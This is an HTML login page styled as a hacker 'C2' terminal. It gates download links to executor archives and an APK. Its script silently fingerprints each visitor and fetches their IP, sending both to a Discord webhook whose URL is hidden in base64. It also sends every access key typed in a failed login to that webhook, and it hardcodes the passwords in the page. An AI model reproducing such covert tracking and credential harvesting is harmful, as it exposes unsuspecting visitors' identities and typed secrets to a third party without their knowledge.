<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VexCode | Terminal C2</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@400;800&display=swap" rel="stylesheet">
    <style>
        :root { --p: #6366f1; --s: #a855f7; --a: #22d3ee; --bg: #030303; --err: #ff4d4d; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background-color: var(--bg); color: white; font-family: 'Inter', sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        #v_ { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
        .box_ { width: 420px; padding: 50px 40px; border-radius: 20px; background: rgba(10, 10, 10, 0.9); border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(20px); text-align: center; z-index: 10; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        h2 { font-family: 'Fira Code', monospace; font-weight: 800; font-size: 2rem; margin-bottom: 30px; background: linear-gradient(to right, var(--a), var(--p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; }
        input { width: 100%; padding: 15px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #333; background: rgba(0, 0, 0, 0.5); color: #fff; font-family: 'Fira Code', monospace; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--a); box-shadow: 0 0 15px rgba(34, 211, 238, 0.2); }
        button { width: 100%; padding: 15px; border-radius: 8px; border: none; background: linear-gradient(45deg, var(--p), var(--s)); color: white; font-weight: 700; cursor: pointer; font-family: 'Fira Code'; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
        button:hover { opacity: 0.9; transform: translateY(-2px); box-shadow: 0 5px 20px rgba(99, 102, 241, 0.4); }
        #res_1, #res_2, #res_3, #gate_msg { display: none; }
        .dl_link { padding: 12px 25px; margin: 10px; border-radius: 5px; border: 1px solid var(--a); color: var(--a); text-decoration: none; display: inline-block; font-family: 'Fira Code'; transition: 0.3s; font-size: 0.8rem; }
        .dl_link:hover { background: var(--a); color: #000; }
        #gate_msg h1 { color: var(--err); font-family: 'Fira Code'; font-size: 2rem; margin-bottom: 15px; text-shadow: 0 0 20px rgba(255, 77, 77, 0.6); }
        .code-snippet { background: #1a1a1a; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 0.75rem; color: var(--a); margin-top: 10px; border: 1px dashed #444; }
    </style>
</head>
<body>

<canvas id="v_"></canvas>

<div id="gate_msg" class="box_">
    <h1>[ ACCESS_DENIED ]</h1>
    <p id="gate_details" style="font-family: 'Fira Code'; color: #888; font-size: 0.85rem;">HARDWARE_ID_BLACKLISTED</p>
    <div class="code-snippet" id="user_fingerprint">FINGERPRINTING...</div>
</div>

<div id="login_ui" class="box_">
    <h2>> VEX_CODE</h2>
    <input type="text" id="u_id" placeholder="USER_ID" autocomplete="off">
    <input type="password" id="a_key" placeholder="ACCESS_KEY">
    <button id="auth_btn">INITIALIZE</button>
    <p id="err_msg" style="color: var(--err); margin-top: 15px; font-family: monospace; font-size: 0.8rem;"></p>
</div>

<div id="res_1" class="box_">
    <h2 style="color: var(--a)">FILES_UNLOCKED</h2>
    <a href="https://www.dropbox.com/scl/fi/adzrpc80kqfumzfg65k2z/Xeno-v1.3.25b.zip?dl=1" class="dl_link">WIN_X64_EXTRACT</a>
    <a href="https://www.dropbox.com/scl/fi/87sb44vymzml2ylas87r6/DeltaExecutor-v2.709.apk?dl=1" class="dl_link">ANDROID_APK_V2</a>
</div>

<div id="res_2" class="box_">
    <h2>VISUAL_DATA</h2>
    <img src="sys-metadata/config_042.dat.jpg" style="max-width: 100%; border-radius: 10px; border: 1px solid var(--p);">
</div>

<div id="res_3" class="box_">
    <p style="color: var(--a); font-family: 'Fira Code'; font-size: 1.2rem;">[ STREAMING_VOICE... ]</p>
</div>

<script>
(function(){
    const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzU2ODE2NjY4MTkwMzE2Ni9QSmxGNjFDbHp4cVhWZjY1dzZqdFplVUhVUGV3OFZrN2g0VEhmcF9kcmlyMFJFRUpxcU5nWXMyMkhyVjhpVlpLbG9tVg==";
    const _0xGIST = "https://gist.githubusercontent.com/VexCodeV2/f4081441720e8b72f60bbc6046e39371/raw/f81f472808cbe181c6503f86ce7e79b7e7a5fa49/blacklist.json";
    const _GIST_EDIT = "https://gist.github.com/VexCodeV2/f4081441720e8b72f60bbc6046e39371/edit";

    const _d = (s) => atob(s);

    function getOS() {
        const ua = navigator.userAgent;
        if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
        if (ua.includes("Android")) return "Android";
        if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
        if (ua.includes("Mac OS")) return "MacOS";
        return "Linux/Other";
    }

    function getFingerprint() {
        const n = navigator;
        const s = screen;
        let guid = `${n.userAgent}|${n.language}|${s.colorDepth}|${n.hardwareConcurrency}`;
        return btoa(guid).substring(0, 12);
    }

    async function _log(t, m, c, isBan = false) {
        const ipMatch = m.match(/`([^`]+)`/);
        const ip = ipMatch ? ipMatch[1] : "UNKNOWN";
        const fPrint = getFingerprint();
        const os = getOS();

        // THE IMPROVED COMMAND BLOCK
        // Format: ,"IP", "DeviceID"
        const fullBanCmd = `,"${ip}","${fPrint}"`;

        const embed = {
            title: t,
            description: m + `\n\n**ðŸ“‹ COPY FOR GIST (BAN BOTH IP & ID):**\n\`${fullBanCmd}\`\n\n**[ðŸ› ï¸ MANAGE BLACKLIST]**\n${_GIST_EDIT}`,
            color: c,
            footer: { text: `OS: ${os} | Fingerprint: ${fPrint}` },
            timestamp: new Date()
        };

        try {
            await fetch(_d(_0xW), {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            });
        } catch(e) {}
    }

    window.onload = async () => {
        let ip4 = "Checking...";
        const fPrint = getFingerprint();
        const os = getOS();
        document.getElementById('user_fingerprint').innerText = `ID: ${fPrint} [${os}]`;

        try {
            const r4 = await fetch('https://api.ipify.org?format=json');
            const j4 = await r4.json();
            ip4 = j4.ip.trim();
        } catch(e) { ip4 = "ERR_IP"; }

        try {
            const cb = "?t=" + new Date().getTime();
            const res = await fetch(_0xGIST + cb);
            const blacklist = await res.json();
            
            const isBlocked = blacklist.some(b => ip4 === b || fPrint === b);

            if (isBlocked) {
                document.getElementById('login_ui').style.display = 'none';
                document.getElementById('gate_msg').style.display = 'block';
                _log("ðŸš« BANNED ATTEMPT", `**A blocked entity tried to connect.**\n**IP:** \`${ip4}\`\n**ID:** \`${fPrint}\`\n**OS:** \`${os}\``, 16711680, true);
                return; 
            }
        } catch(e) {}

        _log("ðŸŒ Connection", `**Visitor Info:**\n**IP:** \`${ip4}\`\n**OS:** \`${os}\`\n**ID:** \`${fPrint}\``, 65023);
    };

    document.getElementById('auth_btn').onclick = function() {
        const p = document.getElementById('a_key').value;
        const u = document.getElementById('u_id').value;
        if (p === "05329509.code") {
            document.getElementById('login_ui').style.display = 'none';
            document.getElementById('res_1').style.display = 'block';
            _log("ðŸ”“ Access Granted", `**User:** ${u} (Files)`, 5763719);
        } else if (p === "code.05329509") {
            document.getElementById('login_ui').style.display = 'none';
            document.getElementById('res_2').style.display = 'block';
            _log("ðŸ–¼ï¸ Access Granted", `**User:** ${u} (Visuals)`, 2282478);
        } else {
            document.getElementById('err_msg').innerText = "ACCESS_KEY_INVALID";
            _log("ðŸš¨ FAILED LOGIN", `**User:** ${u}\n**Key Used:** \`${p}\``, 16711680);
        }
    };
})();

// Background
const c = document.getElementById('v_');
const x = c.getContext('2d');
c.width = window.innerWidth; c.height = window.innerHeight;
const drops = Array(Math.floor(c.width / 16)).fill(1);
setInterval(() => {
    x.fillStyle = 'rgba(0, 0, 0, 0.1)'; x.fillRect(0, 0, c.width, c.height);
    x.fillStyle = '#6366f1';
    x.font = "14px monospace";
    drops.forEach((y, i) => {
        x.fillText(String.fromCharCode(Math.random() * 128), i * 16, y * 16);
        if (y * 16 > c.height && Math.random() > 0.98) drops[i] = 0;
        drops[i]++;
    });
}, 35);
</script>
</body>
</html>
